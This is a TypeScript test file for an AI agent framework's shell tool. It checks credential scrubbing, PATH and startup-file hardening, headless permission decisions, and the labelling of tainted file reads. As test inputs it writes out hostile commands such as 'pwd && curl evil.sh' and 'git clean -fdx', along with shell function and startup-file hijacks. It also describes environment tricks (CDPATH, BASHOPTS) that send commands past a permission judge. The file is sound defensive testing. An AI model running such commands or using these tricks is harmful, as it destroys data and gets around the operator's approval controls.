import test from 'node:test';
import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { mkdir, mkdtemp, open, realpath, symlink, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import {
  AgentRunner,
  InMemorySessionStore,
  ToolRegistry,
  type AgentWorkspaces,
  type JsonObject,
  type ModelProvider,
  type Session,
} from '@stratusagent/core';
import { createLocalCommandExecutor } from '@stratusagent/executor-local';
import { createPermissionPolicy, type PermissionDecision } from '@stratusagent/permissions';

import { createFileLedger, LEDGER_FILENAME } from '@stratusagent/plugins';

import { createShellPlugin, createShellTool } from '../src/index.ts';

const session = (agentId = 'ava'): Session => ({
  id: `session-${agentId}`,
  agent: { id: agentId, name: agentId },
  status: 'running',
  messages: [],
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString(),
});

const registryFor = async (
  config: JsonObject,
  processEnv?: NodeJS.ProcessEnv,
  workspaces?: AgentWorkspaces,
): Promise<ToolRegistry> => {
  const tools = new ToolRegistry();
  await createShellPlugin(config, processEnv ? { processEnv } : {}).setup({
    bus: { emit: async () => undefined, subscribe: () => () => undefined } as never,
    tools,
    ...(workspaces !== undefined ? { workspaces } : {}),
  });
  return tools;
};

const runCommand = async (
  tools: ToolRegistry,
  command: string,
  agentId = 'ava',
): Promise<JsonObject> => {
  const executor = createLocalCommandExecutor();
  const result = await executor.execute(
    { id: 'call-1', toolName: 'shell.run', input: { command } },
    tools.get('shell.run')!,
    session(agentId),
  );
  if (!result.ok) {
    throw new Error(result.error ?? 'command failed');
  }
  return result.output as JsonObject;
};

test('the child cannot read the daemon’s credentials through its environment', async () => {
  // The daemon's environment, as an operator would have left it.
  const daemonEnv: NodeJS.ProcessEnv = {
    PATH: process.env.PATH,
    HOME: process.env.HOME,
    ANTHROPIC_API_KEY: 'sk-ant-must-not-leak',
    SLACK_BOT_TOKEN: 'xoxb-must-not-leak',
  };
  const tools = await registryFor({}, daemonEnv);

  const dumped = await runCommand(tools, 'env');
  assert.doesNotMatch(String(dumped.stdout), /sk-ant-must-not-leak/);
  assert.doesNotMatch(String(dumped.stdout), /xoxb-must-not-leak/);

  // Named directly, which is what an agent that had read the config would
  // try — and the shape a command-string approval would not reveal.
  const echoed = await runCommand(tools, 'echo "[$ANTHROPIC_API_KEY]"');
  assert.equal(String(echoed.stdout).trim(), '[]');

  // What was granted is there, so the scrub is a boundary rather than a
  // broken environment.
  const pathed = await runCommand(tools, 'echo "$PATH"');
  assert.equal(String(pathed.stdout).trim(), daemonEnv.PATH);
});

test('an operator can grant a variable, and only what they granted arrives', async () => {
  const tools = await registryFor(
    { passEnv: ['PATH'], env: { GREETING: 'hello' }, agents: { juno: { env: { GREETING: 'hallo' } } } },
    { PATH: process.env.PATH, ANTHROPIC_API_KEY: 'sk-ant-nope', HOME: '/root' },
  );

  assert.equal(String((await runCommand(tools, 'echo "$GREETING"')).stdout).trim(), 'hello');
  // Per agent, resolved per call — one plugin instance, two answers.
  assert.equal(String((await runCommand(tools, 'echo "$GREETING"', 'juno')).stdout).trim(), 'hallo');
  // HOME was not in this agent's passEnv, so it is not there at all.
  assert.equal(String((await runCommand(tools, 'echo "[$HOME]"')).stdout).trim(), '[]');
});

test('an agent\'s own env adds to the fleet\'s, and a null withholds a shared variable', async () => {
  // Blair's config from #205: her token replaced the shared env wholesale,
  // so her commands had no PATH and could not find node.
  const tools = await registryFor(
    {
      passEnv: [],
      env: { PATH: process.env.PATH ?? '/usr/bin:/bin', SHARED_TOKEN: 'fleet' },
      agents: { blair: { env: { AGENTBOARD_TOKEN: 'blairs', SHARED_TOKEN: null } } },
    },
    {},
  );

  const blair = String((await runCommand(tools, 'echo "[$PATH][$AGENTBOARD_TOKEN][$SHARED_TOKEN]"', 'blair')).stdout).trim();
  assert.equal(blair, `[${process.env.PATH ?? '/usr/bin:/bin'}][blairs][]`);
  // Another agent sees only the fleet's — never blair's token.
  const ava = String((await runCommand(tools, 'echo "[$AGENTBOARD_TOKEN][$SHARED_TOKEN]"', 'ava')).stdout).trim();
  assert.equal(ava, '[][fleet]');

  // A null withholds a name forwarded from the daemon by passEnv too, not
  // only one the shared env set.
  const forwarded = await registryFor(
    { passEnv: ['PATH', 'DAEMON_TOKEN'], agents: { blair: { env: { DAEMON_TOKEN: null } } } },
    { PATH: process.env.PATH ?? '/usr/bin:/bin', DAEMON_TOKEN: 'daemons' },
  );
  assert.equal(String((await runCommand(forwarded, 'echo "[$DAEMON_TOKEN]"', 'blair')).stdout).trim(), '[]');
  assert.equal(String((await runCommand(forwarded, 'echo "[$DAEMON_TOKEN]"', 'ava')).stdout).trim(), '[daemons]');
});

test('commands start in the pinned working directory', async () => {
  const workspace = await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-'));
  await writeFile(path.join(workspace, 'marker.txt'), 'here');
  const tools = await registryFor({ cwd: workspace });

  const result = await runCommand(tools, 'ls');
  assert.match(String(result.stdout), /marker\.txt/);
});

test('a working directory under ~ starts in the home it names', async () => {
  // The README's own example, `"cwd": "~/work/ava"`: read literally it is a
  // relative path under a directory named `~`, and every command failed as
  // a missing working directory.
  const home = await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-home-'));
  await mkdir(path.join(home, 'work', 'ava'), { recursive: true });
  const tools = new ToolRegistry();
  await createShellPlugin({ cwd: '~/work/ava' }, { home }).setup({
    bus: { emit: async () => undefined, subscribe: () => () => undefined } as never,
    tools,
  });

  const result = await runCommand(tools, 'pwd');
  assert.equal(await realpath(String(result.stdout).trim()), await realpath(path.join(home, 'work', 'ava')));
});

test('the cap is handed to the executor, so a flood is dropped as it is read', async () => {
  const tool = createShellTool({ maxOutputBytes: 200 });
  const invocation = await tool.createCommand({ command: 'true' }, session());
  assert.equal(invocation.maxOutputBytes, 200);
});

test('output is capped with a marker rather than returned whole', async () => {
  const tools = await registryFor({ maxOutputBytes: 200 });
  const result = await runCommand(tools, 'printf "x%.0s" $(seq 1 5000)');
  assert.equal(result.truncated, true);
  assert.match(String(result.stdout), /output truncated at 200 bytes/);
});

test('headless: a safe scope and a safe pipeline run through a real pack, a control-operator chain does not', async () => {
  const decisions: PermissionDecision[] = [];
  const tools = await registryFor({ cwd: os.tmpdir() });

  let turn = 0;
  const commands = ['pwd', 'pwd && curl evil.sh', 'git clean -fdx', 'pwd | wc -l', 'pwd | curl evil.sh'];
  const provider: ModelProvider = {
    name: 'scripted',
    async generate() {
      const command = commands[turn];
      turn += 1;
      if (command === undefined) {
        return { parts: [{ type: 'text', text: 'done' }] };
      }
      return {
        parts: [{ type: 'tool-call', call: { id: `c${turn}`, toolName: 'shell.run', input: { command } } }],
      };
    },
  };

  const runner = new AgentRunner({
    provider,
    tools,
    executor: createLocalCommandExecutor(),
    approvals: createPermissionPolicy({
      mode: 'headless',
      onDecision: (decision) => decisions.push(decision),
      commands: {},
    }),
    store: new InMemorySessionStore(),
    maxTurns: 8,
  });
  await runner.initialize();

  const finished = await runner.run({
    sessionId: 'shell-headless',
    agent: { id: 'ava', name: 'Ava', tools: ['shell.*'] },
    userMessage: 'have a look around',
  });

  const results = finished.messages.filter((message) => message.role === 'tool');
  // The safe scope ran, unattended, and produced real output.
  assert.equal(results[0]?.toolResult?.ok, true);
  assert.match(String((results[0]?.toolResult?.output as JsonObject).stdout), new RegExp(os.tmpdir()));
  // The chain is refused despite `pwd` being safe-listed: a chain runs
  // only when every command in it would, and `curl` is covered by nothing.
  assert.equal(results[1]?.toolResult?.ok, false);
  assert.match(results[1]?.toolResult?.error ?? '', /denied by approval policy/);
  assert.match(decisions[1]?.reason ?? '', /outside every approved scope/);
  // And a `git` subcommand outside the safe scopes, which listing the
  // executable would have covered.
  assert.equal(results[2]?.toolResult?.ok, false);
  assert.match(decisions[2]?.reason ?? '', /outside every approved scope \(git\)/);
  // The command reaches a surface that shows it to a person; it does not
  // reach the reason, which is what the daemon writes to its log.
  assert.equal(decisions[2]?.command, 'git clean -fdx');
  // A pipe of safe stages runs, through a real shell, and the shell agreed
  // with the parser about where it splits.
  assert.equal(results[3]?.toolResult?.ok, true);
  assert.equal(String((results[3]?.toolResult?.output as JsonObject).stdout).trim(), '1');
  // A pipe into a stage nothing covers does not, and the log says so
  // without naming it.
  assert.equal(results[4]?.toolResult?.ok, false);
  assert.match(decisions[4]?.reason ?? '', /outside every approved scope \(a pipeline\)/);
});

test('headless: a by-name grep grant runs a chained, piped, redirected grep through a real pack', async () => {
  const workspace = await realpath(await mkdtemp(path.join(os.tmpdir(), 'stratus-names-')));
  await mkdir(path.join(workspace, 'app'), { recursive: true });
  await writeFile(path.join(workspace, 'app', 'notes.md'), 'one todo\ntwo\nthree todo\n');
  const decisions: PermissionDecision[] = [];
  const tools = await registryFor({ cwd: workspace });

  let turn = 0;
  const commands = [
    'cd app && grep -rn todo . 2>/dev/null | head -1 > hit.txt; cat hit.txt',
    'cd app && grep -rn todo /etc/hosts',
  ];
  const provider: ModelProvider = {
    name: 'scripted',
    async generate() {
      const command = commands[turn];
      turn += 1;
      if (command === undefined) {
        return { parts: [{ type: 'text', text: 'done' }] };
      }
      return { parts: [{ type: 'tool-call', call: { id: `c${turn}`, toolName: 'shell.run', input: { command } } }] };
    },
  };
  const runner = new AgentRunner({
    provider,
    tools,
    executor: createLocalCommandExecutor(),
    approvals: createPermissionPolicy({
      mode: 'headless',
      onDecision: (decision) => decisions.push(decision),
      commands: {
        grantRootFor: () => workspace,
        names: { commandNamesFor: async () => [{ command: 'grep', grantedAt: '2026-10-18T00:00:00.000Z' }], rememberCommandName: async () => {} },
      },
    }),
    store: new InMemorySessionStore(),
    maxTurns: 6,
  });
  await runner.initialize();
  const finished = await runner.run({
    sessionId: 'shell-names',
    agent: { id: 'ava', name: 'Ava', tools: ['shell.*'] },
    userMessage: 'find the todos',
  });
  const results = finished.messages.filter((message) => message.role === 'tool');
  // The shell agreed with the reader: the cd held, the pipe and both
  // redirections happened, and the file landed in the workspace.
  assert.equal(results[0]?.toolResult?.ok, true, decisions[0]?.reason);
  assert.equal(String((results[0]?.toolResult?.output as JsonObject).stdout).trim(), './notes.md:1:one todo');
  assert.equal(existsSync(path.join(workspace, 'app', 'hit.txt')), true);
  // The same grant does not reach outside the workspace.
  assert.equal(results[1]?.toolResult?.ok, false);
});

test('the pack hands the engine the command and nothing else', () => {
  const tool = createShellTool();
  assert.equal(tool.commandFor?.({ command: '  git status  ' }), 'git status');
  assert.equal(tool.commandFor?.({}), undefined);
  // It classifies nothing itself: the risk is the tool's, per invocation
  // judgment is the permission engine's.
  assert.equal(tool.risk, 'gated');
});

test('every tool this plugin registers is one its manifest declares', async () => {
  const manifest = (await import('../package.json', { with: { type: 'json' } })).default as {
    stratus: { contributes: { tools: Array<{ name: string; risk: string }> } };
  };
  const tools = await registryFor({});
  assert.deepEqual(
    tools.list().map((tool) => [tool.name, tool.risk]),
    manifest.stratus.contributes.tools.map((entry) => [entry.name, entry.risk]),
  );
});

test('the agent’s workspace is created before the first command runs', async () => {
  const workspaceRoot = path.join(await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-ws-')), 'workspaces');
  // Nothing has created this yet — which on a fresh install is the state of
  // every agent's workspace, and `spawn` reports a missing cwd as `ENOENT`
  // naming the *shell*, so it reads as a broken interpreter.
  const tools = await registryFor({ workspaceRoot });

  const result = await runCommand(tools, 'pwd');
  assert.equal(String(result.stdout).trim(), path.join(workspaceRoot, 'ava'));

  // One directory per agent, so a second agent's first command does not run
  // in the first agent's.
  const juno = await runCommand(tools, 'pwd', 'juno');
  assert.equal(String(juno.stdout).trim(), path.join(workspaceRoot, 'juno'));
});

test('the workspace is prepared once, before the command, and not again to read its output', async () => {
  const home = await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-prep-'));
  // Preparing is the half that can fail. `parseResult` runs after the
  // subprocess has finished, so asking again there would let a workspace
  // that went away in between turn a command that already ran — and may
  // already have changed something — into a failure somebody retries.
  let prepared = 0;
  const workspaces: AgentWorkspaces = {
    forAgent: (agentId) => path.join(home, 'agents', agentId, 'workspace'),
    prepare: (agentId) => {
      prepared += 1;
      return path.join(home, 'agents', agentId, 'workspace');
    },
    all: async () => [],
  };
  const tools = await registryFor({}, undefined, workspaces);
  const result = await runCommand(tools, 'echo hello');

  assert.equal(String(result.stdout).trim(), 'hello');
  assert.equal(prepared, 1);
});

test('with no configured root the workspace comes from the host, which is not a root plus an id', async () => {
  const home = await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-seam-'));
  // The layout the daemon actually has: the id is in the middle, so a
  // plugin that joined it onto a root would run in the wrong directory.
  const workspaces: AgentWorkspaces = {
    forAgent: (agentId) => path.join(home, 'agents', agentId, 'workspace'),
    prepare: (agentId) => path.join(home, 'agents', agentId, 'workspace'),
    all: async () => [],
  };
  const tools = await registryFor({}, undefined, workspaces);
  const result = await runCommand(tools, 'pwd');
  assert.equal(String(result.stdout).trim(), path.join(home, 'agents', 'ava', 'workspace'));
});

test('a working directory the operator named is reported by name when it is missing', async () => {
  const tools = await registryFor({ cwd: '/tmp/stratus-shell-does-not-exist' });
  await assert.rejects(
    () => runCommand(tools, 'pwd'),
    /configured working directory does not exist/,
  );
});

test('cwdFor names where a command would run without preparing anything', async () => {
  const home = await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-cwdfor-'));
  let prepared = 0;
  const workspaces: AgentWorkspaces = {
    forAgent: (agentId) => path.join(home, 'agents', agentId, 'workspace'),
    prepare: (agentId) => {
      prepared += 1;
      return path.join(home, 'agents', agentId, 'workspace');
    },
    all: async () => [],
  };
  const session = { id: 's1', agent: { id: 'ava', name: 'Ava' }, status: 'running', messages: [] } as unknown as Session;
  const tool = createShellTool({}, { workspaces });
  assert.equal(tool.cwdFor?.(session), path.join(home, 'agents', 'ava', 'workspace'));
  assert.equal(prepared, 0);
  // A configured cwd wins, as it does when the command runs.
  const configured = createShellTool({ agents: { ava: { cwd: '~/work/ava' } } }, { workspaces, home });
  assert.equal(configured.cwdFor?.(session), path.join(home, 'work', 'ava'));
});

test('variables that carry options for a judged command never reach it, however they are configured', async () => {
  const tools = await registryFor(
    { passEnv: ['PATH', 'GREP_OPTIONS', 'CDPATH'], env: { RIPGREP_CONFIG_PATH: '/tmp/rgrc', KEEP: 'kept' } },
    { PATH: process.env.PATH, GREP_OPTIONS: '-R', CDPATH: '/tmp' },
  );
  // CDPATH (Codex P1 4309568557) sends `cd foo` somewhere the judge, which
  // follows cd from the working directory, never looked.
  const seen = String((await runCommand(tools, 'echo "[$RIPGREP_CONFIG_PATH][$GREP_OPTIONS][$CDPATH][$KEEP]"')).stdout).trim();
  assert.equal(seen, '[][][][kept]');
});

test('bash option variables never reach the child shell', async () => {
  // Codex P1 4309751930: BASHOPTS=cdable_vars makes `cd HOME` follow $HOME,
  // which the judge reads as a workspace-relative directory.
  const tools = await registryFor(
    { passEnv: ['PATH', 'BASHOPTS', 'SHELLOPTS'], env: { POSIXLY_CORRECT: '1', KEEP: 'kept' } },
    { PATH: process.env.PATH, BASHOPTS: 'cdable_vars', SHELLOPTS: 'braceexpand' },
  );
  const seen = String((await runCommand(tools, 'env | grep -E "^(BASHOPTS|SHELLOPTS|POSIXLY_CORRECT|KEEP)=" | sort')).stdout).trim();
  assert.equal(seen, 'KEEP=kept');
});

test('PATH never includes a directory the agent can write to', async () => {
  const home = await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-path-'));
  const workspaces: AgentWorkspaces = {
    forAgent: (agentId) => path.join(home, 'agents', agentId, 'workspace'),
    prepare: (agentId) => path.join(home, 'agents', agentId, 'workspace'),
    all: async () => [],
  };
  const inside = path.join(home, 'agents', 'ava', 'workspace', 'bin');
  const tools = await registryFor(
    { passEnv: [], env: { PATH: `.:${inside}::relative/bin:/usr/bin:/bin` } },
    {},
    workspaces,
  );
  assert.equal(String((await runCommand(tools, 'echo "$PATH"')).stdout).trim(), '/usr/bin:/bin');
  // Filtered to nothing is not an empty PATH, which sh reads as the cwd.
  const emptied = await registryFor({ passEnv: [], env: { PATH: `.:${inside}` } }, {}, workspaces);
  assert.equal(String((await runCommand(emptied, 'echo "$PATH"')).stdout).trim(), '/usr/bin:/bin');
});

test('PATH keeps out the workspace when either side is reached through a symlink', async () => {
  const root = await realpath(await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-alias-')));
  const real = path.join(root, 'real');
  await mkdir(path.join(real, 'agents', 'ava', 'workspace'), { recursive: true });
  const alias = path.join(root, 'alias');
  await symlink(real, alias);
  const via = (base: string): AgentWorkspaces => ({
    forAgent: (agentId) => path.join(base, 'agents', agentId, 'workspace'),
    prepare: (agentId) => path.join(base, 'agents', agentId, 'workspace'),
    all: async () => [],
  });
  // The workspace through the alias, PATH through the real path, and the
  // reverse; bin does not exist yet, so the agent could still create it.
  for (const [workspaceBase, pathBase] of [[alias, real], [real, alias]] as const) {
    const bin = path.join(pathBase, 'agents', 'ava', 'workspace', 'bin');
    const tools = await registryFor({ passEnv: [], env: { PATH: `${bin}:/usr/bin:/bin` } }, {}, via(workspaceBase));
    assert.equal(String((await runCommand(tools, 'echo "$PATH"')).stdout).trim(), '/usr/bin:/bin', `${workspaceBase} vs ${bin}`);
  }
});

test('PATH resolves a symlink before the .. that follows it, as the kernel does', async () => {
  const root = await realpath(await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-dotdot-')));
  const workspace = path.join(root, 'agents', 'ava', 'workspace');
  await mkdir(path.join(workspace, 'sub'), { recursive: true });
  await mkdir(path.join(workspace, 'bin'), { recursive: true });
  await mkdir(path.join(root, 'aliases'), { recursive: true });
  // /aliases/a -> <workspace>/sub, so /aliases/a/../bin is <workspace>/bin
  // to the shell, though collapsing `..` first reads it as /aliases/bin.
  await symlink(path.join(workspace, 'sub'), path.join(root, 'aliases', 'a'));
  const entry = `${root}/aliases/a/../bin`;
  const workspaces: AgentWorkspaces = {
    forAgent: (agentId) => path.join(root, 'agents', agentId, 'workspace'),
    prepare: (agentId) => path.join(root, 'agents', agentId, 'workspace'),
    all: async () => [],
  };
  const tools = await registryFor({ passEnv: [], env: { PATH: `${entry}:/usr/bin:/bin` } }, {}, workspaces);
  assert.equal(String((await runCommand(tools, 'echo "$PATH"')).stdout).trim(), '/usr/bin:/bin');
});

test('nothing a shell runs before the command is passed to it', async () => {
  const tools = await registryFor(
    { passEnv: ['PATH'], env: { BASH_ENV: '/tmp/x', ENV: '/tmp/y', ZDOTDIR: '/tmp/z', 'BASH_FUNC_cat%%': '() { echo pwned; }', KEEP: 'kept' } },
    { PATH: process.env.PATH },
  );
  const seen = String((await runCommand(tools, 'echo "[$BASH_ENV][$ENV][$ZDOTDIR][$KEEP]"; env | grep -c BASH_FUNC_ || true')).stdout).trim();
  assert.equal(seen, '[][][][kept]\n0');
});

test('zsh runs without the user startup files that could redefine a command', { skip: !existsSync('/bin/zsh') }, async () => {
  const home = await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-zsh-'));
  await writeFile(path.join(home, '.zshenv'), 'cat() { echo hijacked; }\n');
  const tools = await registryFor({ shell: '/bin/zsh', passEnv: ['PATH'], env: { HOME: home } }, { PATH: process.env.PATH });
  const result = await runCommand(tools, 'echo real | cat');
  assert.equal(String(result.stdout).trim(), 'real');
});

test('tcsh runs without the startup files that could alias a command', { skip: !existsSync('/bin/tcsh') }, async () => {
  const home = await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-tcsh-'));
  await writeFile(path.join(home, '.tcshrc'), 'alias cat echo hijacked\n');
  const tools = await registryFor({ shell: '/bin/tcsh', passEnv: ['PATH'], env: { HOME: home } }, { PATH: process.env.PATH });
  const result = await runCommand(tools, 'echo real | cat');
  assert.equal(String(result.stdout).trim(), 'real');
});

test('git never opens an editor from a shell command', async () => {
  const tools = await registryFor({ passEnv: ['PATH'], env: { GIT_EDITOR: 'vim' } }, { PATH: process.env.PATH });
  assert.equal(String((await runCommand(tools, 'echo "$GIT_EDITOR $GIT_SEQUENCE_EDITOR"')).stdout).trim(), 'true true');
});

test('git is never pointed at another repository through the environment', async () => {
  const tools = await registryFor({ passEnv: ['PATH'], env: { GIT_DIR: '/outside/.git', GIT_WORK_TREE: '/outside', GIT_CONFIG_GLOBAL: '/keep/gitconfig' } }, { PATH: process.env.PATH });
  assert.equal(String((await runCommand(tools, 'echo "[$GIT_DIR][$GIT_WORK_TREE][$GIT_CONFIG_GLOBAL]"')).stdout).trim(), '[][][/keep/gitconfig]');
});

// The tainted-write ledger `fs.read` consults. A shell read of the same
// file must not come back cleaner than `fs.read` of it would.
const ledgerHome = async (): Promise<{ workspaces: AgentWorkspaces; workspace: string }> => {
  const home = await realpath(await mkdtemp(path.join(os.tmpdir(), 'stratus-shell-ledger-')));
  const workspace = path.join(home, 'agents', 'ava', 'workspace');
  await mkdir(workspace, { recursive: true });
  const workspaces: AgentWorkspaces = {
    forAgent: (agentId) => path.join(home, 'agents', agentId, 'workspace'),
    prepare: (agentId) => path.join(home, 'agents', agentId, 'workspace'),
    all: async () => [workspace],
  };
  return { workspaces, workspace };
};

const runLabelled = async (tools: ToolRegistry, command: string) =>
  createLocalCommandExecutor().execute(
    { id: 'call-1', toolName: 'shell.run', input: { command } },
    tools.get('shell.run')!,
    session('ava'),
  );

test('a shell read after a tainted write carries the ledger\'s label, as fs.read would', async () => {
  const { workspaces, workspace } = await ledgerHome();
  const notes = path.join(workspace, 'notes.txt');
  await writeFile(notes, 'text a web page wrote\n');
  await createFileLedger((id) => workspaces.forAgent(id)).recordWrite('ava', notes, 'external');
  const tools = await registryFor({}, undefined, workspaces);

  const read = await runLabelled(tools, 'cat notes.txt');
  assert.equal(read.ok, true);
  assert.equal(read.trust, 'external');

  // A failing command's output reaches the model too.
  const failed = await runLabelled(tools, 'cat notes.txt; exit 3');
  assert.equal(failed.ok, false);
  assert.equal(failed.trust, 'external');
});

test('a tainted write that lands while the command runs still labels its result', async () => {
  // Another turn of the same agent writes after the command was built but
  // before it reads the file: the ledger is read again once it finishes,
  // on every exit — success, failure and timeout.
  for (const [command, timeoutMs, ok] of [
    ['sleep 0.4; cat notes.txt', undefined, true],
    ['sleep 0.4; cat notes.txt; exit 3', undefined, false],
    ['sleep 0.4; cat notes.txt; sleep 5', 1_000, false],
  ] as const) {
    const { workspaces, workspace } = await ledgerHome();
    const notes = path.join(workspace, 'notes.txt');
    await writeFile(notes, 'my own notes\n');
    const tools = await registryFor({}, undefined, workspaces);
    const running = createLocalCommandExecutor().execute(
      { id: 'call-1', toolName: 'shell.run', input: { command, ...(timeoutMs ? { timeoutMs } : {}) } },
      tools.get('shell.run')!,
      session('ava'),
    );
    await new Promise((resolve) => setTimeout(resolve, 150));
    await createFileLedger((id) => workspaces.forAgent(id)).recordWrite('ava', notes, 'external');
    await writeFile(notes, 'text a web page wrote\n');
    const result = await running;
    assert.equal(result.ok, ok, command);
    assert.equal(result.trust, 'external', command);
  }
});

test('with nothing tainted on record a shell result stays unknown', async () => {
  const { workspaces, workspace } = await ledgerHome();
  await writeFile(path.join(workspace, 'notes.txt'), 'my own notes\n');
  const tools = await registryFor({}, undefined, workspaces);

  const read = await runLabelled(tools, 'cat notes.txt');
  assert.equal(read.ok, true);
  assert.equal(read.trust, 'unknown');
});

test('another agent\'s tainted writes do not label this agent\'s commands', async () => {
  const { workspaces } = await ledgerHome();
  const juno = workspaces.forAgent('juno');
  await mkdir(juno, { recursive: true });
  await writeFile(path.join(juno, 'page.txt'), 'fetched\n');
  await createFileLedger((id) => workspaces.forAgent(id)).recordWrite('juno', path.join(juno, 'page.txt'), 'external');
  const tools = await registryFor({}, undefined, workspaces);

  const read = await runLabelled(tools, 'echo hi');
  assert.equal(read.trust, 'unknown');
});

test('a ledger that cannot be read labels the result external rather than stopping the command', async () => {
  const { workspaces, workspace } = await ledgerHome();
  await writeFile(path.join(workspace, LEDGER_FILENAME), 'not a ledger line\n');
  const tools = await registryFor({}, undefined, workspaces);

  const read = await runLabelled(tools, 'echo hi');
  assert.equal(read.ok, true);
  assert.equal(String((read.output as JsonObject).stdout).trim(), 'hi');
  assert.equal(read.trust, 'external');
});

test('a ledger replaced by a FIFO labels the result external instead of hanging the turn', async () => {
  // Nothing ever writes to the FIFO, so a plain read of it never returns.
  const { workspaces, workspace } = await ledgerHome();
  const fifo = path.join(workspace, LEDGER_FILENAME);
  execFileSync('mkfifo', [fifo]);
  const tools = await registryFor({}, undefined, workspaces);
  // Refused before any read starts: nothing is left parked on the FIFO (a
  // parked read would keep this test file from exiting), and the command
  // does not wait out a timeout either side of running.
  const started = Date.now();
  const read = await runLabelled(tools, 'echo hi');
  assert.equal(String((read.output as JsonObject).stdout).trim(), 'hi');
  assert.equal(read.trust, 'external');
  assert.ok(Date.now() - started < 900, `took ${Date.now() - started}ms`);
});

test('with the external-content gate on, a shell read of a tainted file closes the session\'s grants', async () => {
  const { workspaces, workspace } = await ledgerHome();
  const notes = path.join(workspace, 'notes.txt');
  await writeFile(notes, 'text a web page wrote\n');
  await createFileLedger((id) => workspaces.forAgent(id)).recordWrite('ava', notes, 'external');
  // A repository the agent's own git can read unattended under workspace
  // autonomy, which the gate withdraws once the session is external.
  const git = (args: string) => createLocalCommandExecutor().execute(
    { id: 'git', toolName: 'shell.run', input: { command: `git ${args}` } },
    createShellTool({ cwd: workspace }),
    session('ava'),
  );
  assert.equal((await git('init -q')).ok, true);
  assert.equal((await git('-c user.email=a@b -c user.name=a commit -q --allow-empty -m one')).ok, true);

  const decisions: PermissionDecision[] = [];
  const tools = await registryFor({}, undefined, workspaces);
  const commands = ['cat notes.txt', 'git log --oneline'];
  let turn = 0;
  const provider: ModelProvider = {
    name: 'scripted',
    async generate() {
      const command = commands[turn];
      turn += 1;
      return command === undefined
        ? { parts: [{ type: 'text', text: 'done' }] }
        : { parts: [{ type: 'tool-call', call: { id: `c${turn}`, toolName: 'shell.run', input: { command } } }] };
    },
  };
  const runner = new AgentRunner({
    provider,
    tools,
    executor: createLocalCommandExecutor(),
    approvals: createPermissionPolicy({
      mode: 'headless',
      onDecision: (decision) => decisions.push(decision),
      commands: { workspace: { directoryFor: () => workspace } },
      gateExternalContent: () => true,
    }),
    store: new InMemorySessionStore(),
    maxTurns: 6,
  });
  await runner.initialize();
  const finished = await runner.run({
    sessionId: 'shell-ledger-gate',
    agent: { id: 'ava', name: 'Ava', tools: ['shell.*'] },
    userMessage: 'read your notes',
  });

  const results = finished.messages.filter((message) => message.role === 'tool');
  // The read itself runs unattended, and arrives labelled as fs.read would.
  assert.equal(results[0]?.toolResult?.ok, true);
  assert.equal(results[0]?.toolResult?.trust, 'external');
  // And the git read that workspace autonomy would otherwise allow asks,
  // which headless cannot do.
  assert.equal(results[1]?.toolResult?.ok, false);
  assert.match(decisions[1]?.reason ?? '', /after this conversation read external content \(from shell\.run\)/);
});
